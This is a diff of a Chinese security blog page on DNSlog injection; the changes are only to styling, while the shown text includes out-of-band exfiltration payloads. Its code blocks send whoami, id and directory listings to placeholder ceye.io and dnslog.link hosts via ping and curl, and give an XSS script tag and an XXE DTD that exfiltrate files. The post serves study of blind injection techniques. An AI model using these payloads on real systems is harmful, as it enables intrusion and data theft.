@@ -5,7 +5,7 @@
 
 <link rel='canonical' href='https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/'>
 
-<link rel="stylesheet" href="/scss/style.min.38fa0202e33e55fa6e042fc097bb63d935fa0b23f044ad99a9810606c47ab2b4.css"><meta property='og:title' content='DNSlog注入'>
+<link rel="stylesheet" href="/scss/style.min.9b1fc3b09cf11c2391a1bb047fd93317cd0f3be091b6c8d36d221829af5af94d.css"><meta property='og:title' content='DNSlog注入'>
 <meta property='og:description' content='DNSlog注入学习 前置 域名分级与域名解析过程(DNS) 读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务'>
 <meta property='og:url' content='https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/'>
 <meta property='og:site_name' content='茄子的养殖场'>
@@ -385,30 +385,30 @@
 <h4 id="1sql注入中的盲注">1.SQL注入中的盲注
 </h4><h4 id="2无回显的命令执行">2.无回显的命令执行
 </h4><p><strong>Linux</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ping <span style="color:#2aa198">`</span>whoami<span style="color:#2aa198">`</span>.xxxx.ceye.io
-</span></span><span style="display:flex;"><span> curl http://haha.xxx.ceye.io/<span style="color:#2aa198">`</span>whoami<span style="color:#2aa198">`</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ping <span style="color:#5a2">`</span>whoami<span style="color:#5a2">`</span>.xxxx.ceye.io
+</span></span><span style="display:flex;"><span> curl http://haha.xxx.ceye.io/<span style="color:#5a2">`</span>whoami<span style="color:#5a2">`</span>
 </span></span></code></pre></div><p>像这里还有复杂点的，base64，多行输出等等</p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl http://xxx.dnslog.link/<span style="color:#859900">$(</span>id|base64|tr <span style="color:#2aa198">&#39;\n&#39;</span> <span style="color:#2aa198">&#39;-&#39;</span><span style="color:#859900">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#859900">for</span> i in <span style="color:#859900">$(</span>ls /<span style="color:#859900">)</span>;<span style="color:#859900">do</span> curl <span style="color:#2aa198">&#34;http://</span><span style="color:#268bd2">$i</span><span style="color:#2aa198">.xxx.dnslog.link/&#34;</span>;<span style="color:#859900">done</span>;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl http://xxx.dnslog.link/<span style="color:#00f">$(</span>id|base64|tr <span style="color:#5a2">&#39;\n&#39;</span> <span style="color:#5a2">&#39;-&#39;</span><span style="color:#00f">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">for</span> i in <span style="color:#00f">$(</span>ls /<span style="color:#00f">)</span>;<span style="color:#00f">do</span> curl <span style="color:#5a2">&#34;http://</span><span style="color:#000">$i</span><span style="color:#5a2">.xxx.dnslog.link/&#34;</span>;<span style="color:#00f">done</span>;
 </span></span></code></pre></div><p><strong>Windows</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>ping <span style="color:#268bd2">%USERNAME%</span>.xxx.ceye.io
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>ping <span style="color:#000">%USERNAME%</span>.xxx.ceye.io
 </span></span></code></pre></div><p>这里也有复杂点的，其实都是配合命令行来</p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>获取计算机名：for /F <span style="color:#2aa198">&#34;delims=\&#34;</span> <span style="color:#268bd2">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>获取计算机名：for /F <span style="color:#5a2">&#34;delims=\&#34;</span> <span style="color:#000">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>获取用户名：for /F <span style="color:#2aa198">&#34;delims=\ tokens=2&#34;</span> <span style="color:#268bd2">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
+</span></span><span style="display:flex;"><span>获取用户名：for /F <span style="color:#5a2">&#34;delims=\ tokens=2&#34;</span> <span style="color:#000">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
 </span></span></code></pre></div><h4 id="3无回显ssrf">3.无回显SSRF
 </h4><p>基本是把url换成想要的SSRF.xxxx.ceye.io</p>
 <h4 id="4xss跨站">4.XSS跨站
-</h4><div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>&lt;<span style="color:#268bd2">script</span> <span style="color:#268bd2">src</span>=<span style="color:#268bd2">http</span>:<span style="color:#93a1a1;font-style:italic">//XSS.XXXXX.ceye.io&gt;&lt;/script&gt;
+</h4><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>&lt;<span style="color:#000">script</span> <span style="color:#000">src</span>=<span style="color:#000">http</span>:<span style="color:#888;font-style:italic">//XSS.XXXXX.ceye.io&gt;&lt;/script&gt;
 </span></span></span></code></pre></div><h4 id="5xxe">5.XXE
 </h4><p>改dtd：</p>
-<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#859900">&lt;!ENTITY</span> <span style="color:#268bd2">%</span> <span style="color:#268bd2">all</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#00f">&lt;!ENTITY</span> <span style="color:#000">%</span> <span style="color:#000">all</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#2aa198">&#34;&lt;!ENTITY % send SYSTEM &#39;http://xxxx.ceye.io/%file;&#39;&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&lt;!ENTITY % send SYSTEM &#39;http://xxxx.ceye.io/%file;&#39;&gt;&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#859900">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">&gt;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#268bd2">%all;</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">%all;</span>
 </span></span></code></pre></div><h3 id="tips">Tips
 </h3><p>**为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？</p>
 <p>盲注跑数据太慢的情况下，可以选择<strong>DNS</strong>注入。</p>
